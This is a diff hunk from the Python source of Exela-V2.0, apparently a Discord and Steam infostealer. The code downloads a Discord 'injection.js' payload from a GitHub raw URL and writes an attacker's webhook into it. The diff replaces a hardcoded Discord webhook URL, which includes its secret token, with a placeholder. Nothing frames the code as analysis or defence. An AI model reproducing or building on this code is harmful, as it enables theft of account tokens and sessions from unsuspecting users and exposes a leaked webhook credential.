@@ -1348,7 +1348,7 @@ class Main:
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 async with session.get("https://raw.githubusercontent.com/quicaxd/Exela-V2.0/main/injection/injection.js") as response:
                     data = await response.text()
-                    return data.replace("https://discord.com/api/webhooks/1154107526711885875/NiRTvgpX6duR7elXN25mcCV4SfUaxDq1Jm9YNXpkK42LGi9KbLKKeTaPeCu4gzqoCwlE", webhook)
+                    return data.replace("%WEBHOOK%", webhook)
         except:
             return "null"
     async def GetSteamSession(self) -> None:
